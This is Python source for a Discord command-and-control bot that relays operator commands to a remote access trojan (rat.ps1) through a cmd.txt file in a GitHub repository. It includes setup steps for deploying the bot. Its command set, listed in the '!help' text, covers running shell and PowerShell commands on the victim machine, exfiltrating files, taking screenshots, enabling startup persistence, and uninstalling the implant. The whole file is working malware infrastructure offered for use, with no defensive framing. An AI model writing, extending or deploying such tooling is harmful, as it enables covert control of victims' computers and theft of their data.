"""
Discord C2 Bot — Type commands in your server, the RAT (rat.ps1) executes them.
Deploy on Replit (free) or any Python host.

Setup:
  1. Create a Discord bot at https://discord.com/developers/applications
  2. Get the bot token — paste below (DISCORD_TOKEN)
  3. Get a GitHub token with 'repo' scope for kaikssaqes — paste below (GITHUB_TOKEN)
  4. Invite the bot to your server
  5. Run: python c2bot.py
"""

import discord
import base64
import requests

# ===== CONFIG =====
DISCORD_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
GITHUB_TOKEN = "YOUR_GITHUB_TOKEN_HERE"
GITHUB_REPO = "kaikssaqes/rat"
GITHUB_FILE = "cmd.txt"
COMMAND_CHANNEL = None  # Set to channel ID, or None for all channels
# ==================

def update_cmd(command: str):
    """Write command to cmd.txt on GitHub (base64 for the API, raw serves plain text)."""
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    resp = requests.get(url, headers=headers)
    if resp.status_code == 200:
        sha = resp.json()["sha"]
    else:
        sha = None
    content = base64.b64encode(command.encode()).decode()
    data = {"message": f"C2: {command[:50]}", "content": content}
    if sha:
        data["sha"] = sha
    resp = requests.put(url, headers=headers, json=data)
    return resp.status_code in (200, 201)

class C2Bot(discord.Client):
    async def on_ready(self):
        print(f"[+] C2 Bot online as {self.user}")

    async def on_message(self, message):
        if message.author == self.user:
            return
        if COMMAND_CHANNEL and message.channel.id != COMMAND_CHANNEL:
            return
        c = message.content.strip()
        if c.startswith("! "):
            c = "!" + c[2:]

        if c == "!help":
            await message.channel.send(
                "**RAT C2 Commands**\n```\n"
                "!shell <cmd>    run cmd (e.g. !shell whoami)\n"
                "!ps <cmd>       run powershell\n"
                "!proclist       list processes\n"
                "!download <p>   exfil file from victim\n"
                "!screenshot     capture screen\n"
                "!persist        enable startup persistence\n"
                "!sleep <ms>     set poll interval\n"
                "!kill           terminate RAT\n"
                "!uninstall      remove persistence + exit\n"
                "```"
            )
            return
        if c == "!proclist":
            ok = update_cmd("proclist")
        elif c.startswith("!shell "):
            ok = update_cmd(f"shell:{c[7:]}")
        elif c.startswith("!ps "):
            ok = update_cmd(f"ps:{c[4:]}")
        elif c.startswith("!download "):
            ok = update_cmd(f"download:{c[10:]}")
        elif c == "!screenshot":
            ok = update_cmd("screenshot")
        elif c == "!persist":
            ok = update_cmd("persist")
        elif c.startswith("!sleep "):
            ok = update_cmd(f"sleep:{c[7:]}")
        elif c == "!kill":
            ok = update_cmd("kill")
        elif c == "!uninstall":
            ok = update_cmd("uninstall")
        else:
            return
        await message.channel.send("✅ sent" if ok else "❌ failed to update cmd.txt")

if __name__ == "__main__":
    intents = discord.Intents.default()
    intents.message_content = True
    bot = C2Bot(intents=intents)
    bot.run(DISCORD_TOKEN)
